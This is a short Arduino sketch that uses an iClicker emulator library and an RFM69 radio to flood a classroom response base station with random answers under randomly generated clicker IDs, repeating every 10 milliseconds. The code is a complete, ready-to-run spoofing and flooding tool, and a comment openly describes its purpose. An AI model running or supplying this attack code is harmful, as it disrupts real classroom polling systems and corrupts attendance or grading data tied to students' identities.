#include <iClickerEmulator.h>
#include <string.h>
#include <Arduino.h>

/* UPDATE THESE FOR YOUR PARTICULAR BOARD */
#define IS_RFM69HW true //make true if using w (high-wattage) version
#define IRQ_PIN PB4 // This is 3 on adafruit feather (DIO0 on the radio, used for callbacks when the radio gets a packet)
#define CSN PA4 // This is 8 on adafruit feather. I think it's the NSS (slave select) pin? In fact, I'm almost sure of it.
/* END THINGS YOU MUST UPDATE */

iClickerEmulator clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);


// This will flood base station with random answers under random ids
// Use at your own risk...

void setup()
{
  pinMode(LED_BUILTIN, OUTPUT);
    Serial.begin(9600);
    clicker.begin(iClickerChannels::AA); //set channel to AA
    //clicker.dumpRegisters();
}


void loop()
{
  digitalWrite(LED_BUILTIN, LOW);//on
  uint8_t id[4];
  iClickerEmulator::randomId(id);
  iClickerAnswer ans = clicker.randomAnswer();
  clicker.submitAnswer( id, ans, false, 100);

  digitalWrite(LED_BUILTIN, HIGH);//off
  delay(10);


}
